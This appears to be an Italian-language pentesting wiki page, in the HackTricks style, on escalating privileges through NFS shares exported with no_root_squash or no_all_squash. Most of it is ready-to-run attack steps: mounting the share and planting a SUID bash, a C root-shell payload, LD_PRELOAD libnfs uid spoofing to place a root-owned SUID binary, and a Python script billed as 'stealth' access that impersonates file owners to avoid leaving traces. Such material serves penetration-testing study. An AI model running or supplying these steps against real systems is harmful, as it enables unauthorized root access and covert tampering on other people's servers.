{{#include ../../banners/hacktricks-training.md}}

Leggi il _ **/etc/exports** _ file, se trovi qualche directory configurata come **no_root_squash**, allora puoi **accedervi** da **client** e **scrivere dentro** quella directory **come** se fossi il **root** locale della macchina.

**no_root_squash**: Questa opzione dà fondamentalmente autorità all'utente root sul client di accedere ai file sul server NFS come root. E questo può portare a gravi implicazioni di sicurezza.

**no_all_squash:** Questa è simile all'opzione **no_root_squash** ma si applica agli **utenti non-root**. Immagina di avere una shell come utente nobody; controlla il file /etc/exports; l'opzione no_all_squash è presente; controlla il file /etc/passwd; emula un utente non-root; crea un file suid come quell'utente (montando usando nfs). Esegui il suid come utente nobody e diventa un utente diverso.

# Privilege Escalation

## Remote Exploit

Se hai trovato questa vulnerabilità, puoi sfruttarla:

- **Montando quella directory** in una macchina client, e **come root copiando** dentro la cartella montata il **/bin/bash** binario e dandogli diritti **SUID**, ed **eseguendo dalla macchina vittima** quel binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Montare quella directory** in una macchina client e **come root copiare** all'interno della cartella montata il nostro payload compilato che sfrutterà il permesso SUID, dargli diritti **SUID** e **eseguire da** quella macchina vittima quel binario (puoi trovare qui alcuni [C SUID payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Nota che se puoi creare un **tunnel dalla tua macchina alla macchina della vittima, puoi comunque utilizzare la versione Remota per sfruttare questa escalation di privilegi tunnelando le porte richieste**.\
> Il seguente trucco è nel caso in cui il file `/etc/exports` **indichi un IP**. In questo caso **non sarai in grado di utilizzare** in nessun caso il **remote exploit** e dovrai **sfruttare questo trucco**.\
> Un altro requisito necessario affinché l'exploit funzioni è che **l'export all'interno di `/etc/export`** **deve utilizzare il flag `insecure`**.\
> --_Non sono sicuro che se `/etc/export` indica un indirizzo IP questo trucco funzionerà_--

## Basic Information

Lo scenario prevede di sfruttare una condivisione NFS montata su una macchina locale, sfruttando un difetto nella specifica NFSv3 che consente al client di specificare il proprio uid/gid, potenzialmente abilitando l'accesso non autorizzato. Lo sfruttamento prevede l'uso di [libnfs](https://github.com/sahlberg/libnfs), una libreria che consente la falsificazione delle chiamate RPC NFS.

### Compiling the Library

I passaggi per la compilazione della libreria potrebbero richiedere aggiustamenti in base alla versione del kernel. In questo caso specifico, le syscalls fallocate sono state commentate. Il processo di compilazione prevede i seguenti comandi:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Esecuzione dell'Exploit

L'exploit prevede la creazione di un semplice programma C (`pwn.c`) che eleva i privilegi a root e poi esegue una shell. Il programma viene compilato e il binario risultante (`a.out`) viene posizionato sulla condivisione con suid root, utilizzando `ld_nfs.so` per falsificare l'uid nelle chiamate RPC:

1. **Compila il codice dell'exploit:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Posiziona l'exploit sulla condivisione e modifica i suoi permessi falsificando l'uid:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Esegui l'exploit per ottenere privilegi di root:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell per Accesso ai File in Modo Stealth

Una volta ottenuto l'accesso root, per interagire con la condivisione NFS senza cambiare la proprietà (per evitare di lasciare tracce), viene utilizzato uno script Python (nfsh.py). Questo script regola l'uid per corrispondere a quello del file a cui si accede, consentendo l'interazione con i file sulla condivisione senza problemi di permesso:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Esegui come:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
